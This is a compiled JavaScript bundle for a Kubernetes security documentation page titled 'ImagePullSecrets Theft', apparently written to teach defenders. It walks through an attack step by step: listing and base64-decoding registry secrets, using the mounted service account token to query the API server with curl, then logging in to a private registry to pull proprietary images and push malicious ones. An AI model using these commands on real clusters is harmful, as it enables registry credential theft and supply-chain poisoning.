"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[9652],{7174(e,t,s){s.r(t),s.d(t,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"attack-vectors/imagepullsecrets-theft","title":"ImagePullSecrets Theft","description":"Attack scenario demonstrating how attackers extract image pull secrets to gain unauthorized access to private container registries.","source":"@site/docs/attack-vectors/imagepullsecrets-theft.md","sourceDirName":"attack-vectors","slug":"/attack-vectors/imagepullsecrets-theft","permalink":"/kubernetes-security/attack-vectors/imagepullsecrets-theft","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack-vectors/imagepullsecrets-theft.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/kubernetes-security/tags/attack-vector"},{"inline":true,"label":"secrets","permalink":"/kubernetes-security/tags/secrets"},{"inline":true,"label":"registry","permalink":"/kubernetes-security/tags/registry"},{"inline":true,"label":"supply-chain","permalink":"/kubernetes-security/tags/supply-chain"},{"inline":true,"label":"CKS","permalink":"/kubernetes-security/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1771236448000,"sidebarPosition":18,"frontMatter":{"sidebar_position":18,"title":"ImagePullSecrets Theft","description":"Attack scenario demonstrating how attackers extract image pull secrets to gain unauthorized access to private container registries.","keywords":["kubernetes security","imagepullsecrets","container registry security","docker registry credentials","secrets theft","private registry access","registry authentication","kubernetes secrets","docker credentials","container security"],"tags":["attack-vector","secrets","registry","supply-chain","CKS"],"related":["/kubernetes-security/best-practices/cluster-setup-and-hardening/secrets-management/imagepullsecrets-security/","/kubernetes-security/attack-vectors/insecure-secrets-management/","/kubernetes-security/attack-vectors/supply-chain-attacks/","/kubernetes-security/best-practices/cluster-setup-and-hardening/rbac-and-identity/insecure-rbac-permissions-mitigation/"]},"sidebar":"default","previous":{"title":"Compromised Sidecars","permalink":"/kubernetes-security/attack-vectors/compromised-sidecars"},"next":{"title":"Service Account Token Projection Abuse","permalink":"/kubernetes-security/attack-vectors/service-account-token-abuse"}}');var c=s(4848),n=s(8453);const i={sidebar_position:18,title:"ImagePullSecrets Theft",description:"Attack scenario demonstrating how attackers extract image pull secrets to gain unauthorized access to private container registries.",keywords:["kubernetes security","imagepullsecrets","container registry security","docker registry credentials","secrets theft","private registry access","registry authentication","kubernetes secrets","docker credentials","container security"],tags:["attack-vector","secrets","registry","supply-chain","CKS"],related:["/kubernetes-security/best-practices/cluster-setup-and-hardening/secrets-management/imagepullsecrets-security/","/kubernetes-security/attack-vectors/insecure-secrets-management/","/kubernetes-security/attack-vectors/supply-chain-attacks/","/kubernetes-security/best-practices/cluster-setup-and-hardening/rbac-and-identity/insecure-rbac-permissions-mitigation/"]},a="ImagePullSecrets Theft",o={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Extract Secrets from Pod Service Account",id:"1-extract-secrets-from-pod-service-account",level:3},{value:"2. Decode Docker Registry Credentials",id:"2-decode-docker-registry-credentials",level:3},{value:"3. Extract from Pod Specification",id:"3-extract-from-pod-specification",level:3},{value:"4. Access from Mounted Service Account",id:"4-access-from-mounted-service-account",level:3},{value:"5. Use Stolen Credentials to Access Registry",id:"5-use-stolen-credentials-to-access-registry",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,n.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(t.header,{children:(0,c.jsx)(t.h1,{id:"imagepullsecrets-theft",children:"ImagePullSecrets Theft"})}),"\n",(0,c.jsxs)(t.p,{children:["Kubernetes clusters often use ",(0,c.jsx)(t.strong,{children:"private container registries"})," to store proprietary images. Access to these registries is controlled through ",(0,c.jsx)(t.strong,{children:"ImagePullSecrets"}),", which contain registry credentials. If an attacker gains access to a pod or namespace, they can extract these secrets to access private images, steal intellectual property, or inject malicious images into the registry."]}),"\n",(0,c.jsx)(t.p,{children:"This attack demonstrates how compromised pods or excessive RBAC permissions allow attackers to steal registry credentials and pivot to container registry infrastructure."}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,c.jsx)(t.p,{children:"An attacker with access to a pod or namespace can extract ImagePullSecrets in multiple ways."}),"\n",(0,c.jsx)(t.h3,{id:"1-extract-secrets-from-pod-service-account",children:"1. Extract Secrets from Pod Service Account"}),"\n",(0,c.jsx)(t.p,{children:"Most pods automatically mount service account tokens and have access to secrets in their namespace."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"# Inside a compromised pod\nkubectl get secrets -n production\n\n# Look for docker-registry type secrets\nkubectl get secrets -n production -o json | grep docker\n"})}),"\n",(0,c.jsx)(t.h3,{id:"2-decode-docker-registry-credentials",children:"2. Decode Docker Registry Credentials"}),"\n",(0,c.jsx)(t.p,{children:"ImagePullSecrets are base64-encoded Docker config files."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"# Get the secret\nkubectl get secret registry-credentials -n production -o yaml\n\n# The secret contains a .dockerconfigjson field\nkubectl get secret registry-credentials -n production -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d\n"})}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.strong,{children:"Output:"})}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-json",children:'{\n  "auths": {\n    "registry.company.com": {\n      "username": "service-account",\n      "password": "P@ssw0rd123!",\n      "auth": "c2VydmljZS1hY2NvdW50OlBAc3N3MHJkMTIzIQ=="\n    }\n  }\n}\n'})}),"\n",(0,c.jsx)(t.h3,{id:"3-extract-from-pod-specification",children:"3. Extract from Pod Specification"}),"\n",(0,c.jsx)(t.p,{children:"Secrets referenced in pod specs can be retrieved if the attacker has pod read permissions."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"# List all pods and their imagePullSecrets\nkubectl get pods -n production -o json | jq '.items[] | {name: .metadata.name, secrets: .spec.imagePullSecrets}'\n\n# Get the secret directly\nkubectl get secret regcred -n production -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d\n"})}),"\n",(0,c.jsx)(t.h3,{id:"4-access-from-mounted-service-account",children:"4. Access from Mounted Service Account"}),"\n",(0,c.jsx)(t.p,{children:"If a pod has a service account with secrets access, the attacker can query secrets from within the container."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# From inside the pod\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nAPISERVER=https://kubernetes.default.svc\n\ncurl -H "Authorization: Bearer $TOKEN" \\\n  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\\n  $APISERVER/api/v1/namespaces/production/secrets/registry-credentials\n'})}),"\n",(0,c.jsx)(t.h3,{id:"5-use-stolen-credentials-to-access-registry",children:"5. Use Stolen Credentials to Access Registry"}),"\n",(0,c.jsx)(t.p,{children:"Once credentials are extracted, the attacker can access the private registry."}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'# Login to the registry\necho "P@ssw0rd123!" | docker login registry.company.com -u service-account --password-stdin\n\n# List available images\ncurl -u service-account:P@ssw0rd123! https://registry.company.com/v2/_catalog\n\n# Pull proprietary images\ndocker pull registry.company.com/private/payment-service:latest\n\n# Push malicious images\ndocker tag malicious-image:latest registry.company.com/private/payment-service:latest\ndocker push registry.company.com/private/payment-service:latest\n'})}),"\n",(0,c.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,c.jsx)(t.p,{children:"The attacker now has:"}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Full access to private container registry"})," with credentials"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Ability to steal proprietary images"})," containing intellectual property, secrets, and source code"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Capability to push malicious images"})," that will be deployed by the CI/CD pipeline"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Supply chain attack vector"})," by poisoning trusted images"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"Lateral movement"})," to other clusters using the same registry"]}),"\n"]}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,c.jsx)(t.p,{children:"See the mitigation strategies in:"}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.a,{href:"/kubernetes-security/best-practices/cluster-setup-and-hardening/secrets-management/imagepullsecrets-security",children:"Securing ImagePullSecrets"})}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,c.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,c.jsxs)(t.ol,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/",children:"Pull an Image from a Private Registry"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/concepts/configuration/secret/",children:"Secrets"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/",children:"Configure Service Accounts for Pods"})," - Kubernetes Documentation"]}),"\n"]})]})}function u(e={}){const{wrapper:t}={...(0,n.R)(),...e.components};return t?(0,c.jsx)(t,{...e,children:(0,c.jsx)(d,{...e})}):d(e)}},8453(e,t,s){s.d(t,{R:()=>i,x:()=>a});var r=s(6540);const c={},n=r.createContext(c);function i(e){const t=r.useContext(n);return r.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:i(e.components),r.createElement(n.Provider,{value:t},e.children)}}}]);